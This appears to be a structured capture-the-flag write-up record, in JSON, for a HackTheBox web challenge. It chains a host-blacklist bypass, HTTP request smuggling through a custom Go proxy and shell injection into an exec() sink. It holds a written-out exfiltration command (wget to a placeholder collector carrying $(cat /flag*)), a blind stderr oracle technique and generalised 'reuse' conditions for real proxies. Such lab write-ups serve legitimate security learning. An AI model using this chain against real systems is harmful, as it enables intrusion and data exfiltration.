@@ -1,0 +1,109 @@
+{
+  "schema_version": 1,
+  "id": "htb-proxy-smuggling-exec-stderr-oracle",
+  "source_note": "solved/htb-proxy-smuggling-exec-stderr-oracle.md",
+  "challenge": {
+    "name": "Proxy",
+    "platform": "HackTheBox",
+    "event": null,
+    "category": "web",
+    "solved_at": "2026-09-19",
+    "assistance": "self-solved"
+  },
+  "stack": [
+    "go",
+    "net.Dial",
+    "express",
+    "node",
+    "ip-wrapper",
+    "nip.io",
+    "supervisord"
+  ],
+  "preconditions": {
+    "all_of": [
+      "A custom (non-library) proxy sits in front of an internal service and forwards the raw request bytes it read, rather than re-serialising a parsed request.",
+      "The proxy validates the request by splitting the raw buffer on the header/body separator and inspecting only one element of that split.",
+      "The proxy chooses its upstream from a client-controlled host value, and screens that value with substring matching rather than address parsing.",
+      "The internal service exposes at least one route that reaches a shell, a template, a deserialiser or another injectable sink."
+    ],
+    "any_of": [
+      "A URL substring ban hides a route that the internal service still serves.",
+      "A body-content filter blocks the metacharacters the sink needs.",
+      "The vulnerable sink discards its output, so the result has to be read from a status code or a timing difference."
+    ]
+  },
+  "signals": [
+    "strings.Split",
+    "\\r\\n\\r\\n",
+    "net.Dial",
+    "blacklist",
+    "strings.Contains",
+    "Content-Length",
+    "exec(",
+    "express",
+    "X-Powered-By: Express",
+    "nip.io",
+    "flushInterface",
+    "ip-wrapper"
+  ],
+  "chain": [
+    {
+      "step": 1,
+      "stage": "reach the internal host past a substring blacklist",
+      "action": "Encode the internal address in a form that shares no substring with the blocked list and still resolves to it. nip.io serves dotted, dashed and hex encodings: 0af405cf.nip.io resolves to 10.244.5.207 and contains neither '10.' nor any other blocked token. Send it as the Host header on the proxied request.",
+      "why": "blacklistCheck tests for the substrings localhost, 0.0.0.0, 127., 172., 192., 10. — a string test over the raw bytes, not a parse of the destination address, so any alternate encoding of the same address passes."
+    },
+    {
+      "step": 2,
+      "stage": "smuggle a second request past every proxy-side gate",
+      "action": "Build one TCP payload containing two pipelined HTTP requests separated by an extra CRLFCRLF. The first is an allowed route with a small valid JSON body whose length matches its Content-Length; the second is the banned route with the real payload. Read the second HTTP status line in the relayed response.",
+      "why": "The parser does bodySplit := strings.Split(raw, \"\\r\\n\\r\\n\") and then validates only bodySplit[1]; the proxy afterwards writes the whole original byte buffer to the upstream socket. Every filter — URL ban, body regexes, Content-Length check — therefore applies to the first request only, while the backend parses and answers both."
+    },
+    {
+      "step": 3,
+      "stage": "inject into the sink",
+      "action": "Put shell metacharacters in the field the smuggled route passes to exec(). Where the app rejects spaces, separate words with a literal TAB character.",
+      "why": "The input validator here rejected only non-strings, empty strings and strings containing a space; the library interpolated the value straight into a shell command string. Both a literal TAB and ${IFS} are valid space-free separators. Prefer ${IFS} generally, but use a literal TAB whenever an fd-numbered redirect follows, because the fd number is an IO_NUMBER token decided at parse time: in 'x${IFS}2>/dev/null' the lexer reads one word 'x${IFS}2' plus a bare '>', so it redirects stdout and stderr still leaks."
+    },
+    {
+      "step": 4,
+      "stage": "get the data out - test egress before building an oracle",
+      "action": "Before anything else, spend two probes on whether the box can talk out: 'which wget' (or curl/nc/nslookup) and one fetch to a benign public host. If egress exists, exfiltrate in a single request by splicing command substitution into a URL: wget -q -O /dev/null \"http://<collector>/?d=$(cat /flag*)\", using ${IFS} for the separators. Command substitution and backticks are available because the smuggled body is never passed to the body filter.",
+      "why": "One request instead of several hundred. The blocklist that names $() and backticks only ever inspects bodySplit[1], so every metacharacter it forbids is already usable in the smuggled half - once smuggling is proven there is no reason to keep working around that filter."
+    },
+    {
+      "step": 5,
+      "stage": "fallback when there is no egress - boolean oracle from a blind sink",
+      "action": "Silence the command's own stderr with a TAB before the redirect, then append '|| echo E >&2' after the condition under test. A true condition leaves stderr empty and the route answers 200; a false one answers its error status. Read the value with anchored grep over a glob, one character at a time, and keep a negative control in every round.",
+      "why": "The library's callback calls resolve() with no argument so stdout never leaves the process, but it rejects whenever stderr is non-empty and that reject maps to a distinct HTTP status. Making the baseline silent leaves the tested condition as the only writer to stderr, which is one clean bit per request. Slower than out-of-band, but it sends no challenge data to a third party."
+    }
+  ],
+  "first_confirming_probe": {
+    "request": "Send a single TCP write to the proxy: an allowed route with body {\"a\":1} and Content-Length: 7, then \\r\\n\\r\\n, then a second full request to a route the proxy's URL filter bans, with Host set to the alternate-encoded internal address. Count the HTTP status lines in the response.",
+    "expected": "Two HTTP status lines come back on the one connection, and the second belongs to the banned route (any status from the backend, including its own 4xx) rather than the proxy's 400 Bad Request. That proves the bytes after the second CRLFCRLF were forwarded unfiltered. Follow it immediately with two egress probes ('which wget' and one fetch to a benign host) - that answer decides between a one-request exfiltration and a several-hundred-request oracle.",
+    "falsifier": "Only one status line returns, or the single response is the proxy's own 400/403 for the banned URL. Then the proxy re-serialises the request (or validates the whole buffer) and this chain does not apply — move to a different mechanism layer rather than trying more separator variants."
+  },
+  "blast_radius": "High if the injected value is careless. The sink here runs as root inside the challenge container. The route's legitimate function flushes addresses off a network interface: passing a real interface name (eth0, lo) severs the container's networking and permanently bricks the shared instance with no way back. Always pass a name that does not exist (a bare 'x') so the legitimate command fails harmlessly, and carry the payload in the injected suffix only. Read-only conditions (grep -q, ls, test) keep the whole extraction non-destructive. Keep concurrency at one connection: the proxy reads with a fixed 1024-byte buffer and pipelining plus load makes responses unreliable. Separately, the out-of-band route sends challenge data to whatever collector is named in the URL: that is a real disclosure to a third party, so use a collector you control and never a public paste or request-bin for anything beyond a test marker. Where disclosure matters more than speed, the blind oracle keeps everything on the wire between you and the target.",
+  "verification": {
+    "status": "verified_live",
+    "evidence": "The complete flag was confirmed by an anchored oracle query over the live instance: grep -q '^HTB{...}$' /flag*.txt returned HTTP/1.1 200 OK with Content-Length: 0 on the smuggled request, while the same query with one extra character appended returned HTTP/1.1 401 Unauthorized {\"message\":\"Error flushing interface\"}. Both responses were read off the live socket in the same session."
+  },
+  "reuse_when": [
+    "A hand-written proxy, WAF or gateway forwards the original bytes instead of a re-serialised request.",
+    "Source shows a split-then-index-one pattern over a raw request buffer.",
+    "A host or URL allowlist/blocklist is implemented with strings.Contains or equivalent substring matching.",
+    "A command, query or template sink discards its output and only its error path is observable.",
+    "The sink is blind, but the host may have outbound DNS, HTTP or raw TCP - test egress before investing in an oracle."
+  ],
+  "known_traps": [
+    "The visible first request must target a route the proxy actually forwards. Routes the proxy serves itself (/, /server-status here) never open an upstream connection, so nothing is smuggled and the probe looks like a clean falsification when it is not.",
+    "The filler body must satisfy the backend's own body parser. express.json() answers 400 to a non-JSON filler and closes the connection before the smuggled request is read.",
+    "Do not spend effort routing around the body blocklist once smuggling works. It only inspects bodySplit[1], so $(), backticks, ; and | are all already available in the smuggled half.",
+    "${IFS} expands and splits words normally - but not before an fd-numbered redirect. 'x${IFS}2>/dev/null' lexes as the word x${IFS}2 plus a bare '>', which redirects stdout and lets stderr leak; use a literal TAB there. Verified on BusyBox ash and dash.",
+    "'x2>/dev/null' with no separator at all is the same failure one step earlier: the word is x2 plus a stdout redirect, stderr still leaks, and a stderr-based oracle then reads false for every candidate.",
+    "Alpine base images ship no curl. Check wget, nc, nslookup and node before concluding there is no way out.",
+    "The flag filename may be randomised at container start (entrypoint renaming to /flag<random>.txt). Read through a glob, not a fixed path.",
+    "Do not trust a single oracle reading. Re-send each query and include a negative control (a pattern one character off) before accepting a result."
+  ],
+  "flag": null
+}
